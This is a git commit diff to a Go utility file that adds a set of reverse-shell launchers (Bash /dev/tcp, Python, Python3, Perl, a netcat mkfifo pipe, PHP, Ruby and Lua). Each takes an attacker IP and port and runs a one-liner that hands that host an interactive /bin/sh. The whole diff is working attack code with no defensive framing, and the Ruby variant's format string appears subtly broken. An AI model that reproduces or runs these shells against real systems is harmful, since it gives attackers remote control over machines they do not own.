818c52029ea5686fd967e2adcfbf480e2db898a7
Alexis Martin <alexis.martin3190@gmail.com>
2022-11-29 21:49:09 +0100

    Added all reverse shells

--- utils/shell.go
+++ utils/shell.go
@@ -6,12 +6,6 @@ import (
 	"strings"
 )
 
-// if runtime.GOOS == "windows" {
-// 	fmt.Println("Can't Execute this on a windows machine")
-// } else {
-// 	execute()
-// }
-
 func executeCommand(command []string) {
 	out, err := exec.Command(command[0], command[1:]...).Output()
 	if err != nil {
@@ -21,26 +15,50 @@ func executeCommand(command []string) {
 	fmt.Println(output)
 }
 
-func Bash() {
-	ip := "127.0.0.1"
-	port := "9001"
+func Bash(ip string, port string) {
 	command := fmt.Sprintf("bash -c /bin/bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)
 	parsed_command := strings.SplitN(command, " ", 3)
 	executeCommand(parsed_command)
 }
 
-func Python() {
-	ip := "127.0.0.1"
-	port := "9001"
+func Python(ip string, port string) {
 	command := fmt.Sprintf("python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
 	parsed_command := strings.SplitN(command, " ", 3)
 	executeCommand(parsed_command)
 }
 
-func Python3() {
-	ip := "127.0.0.1"
-	port := "9001"
+func Python3(ip string, port string) {
 	command := fmt.Sprintf("python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"%s\",%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
+}
+
+func Perl(ip string, port string) {
+	command := fmt.Sprintf("perl -e use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
+}
+
+func Netcat(ip string, port string) {
+	command := fmt.Sprintf("bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
+}
+
+func Php(ip string, port string) {
+	command := fmt.Sprintf("php -r $sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");", ip, port)
+	parsed_command := strings.SplitN(command, " ", 3)
+	executeCommand(parsed_command)
+}
+
+func Ruby(ip string, port string) {
+	command := fmt.Sprintf("ruby -rsocket -e f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)", ip, port)
+	parsed_command := strings.SplitN(command, " ", 4)
+	executeCommand(parsed_command)
+}
+
+func Lua(ip string, port string) {
+	command := fmt.Sprintf("lua -e require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');", ip, port)
 	parsed_command := strings.SplitN(command, " ", 3)
 	executeCommand(parsed_command)
 }
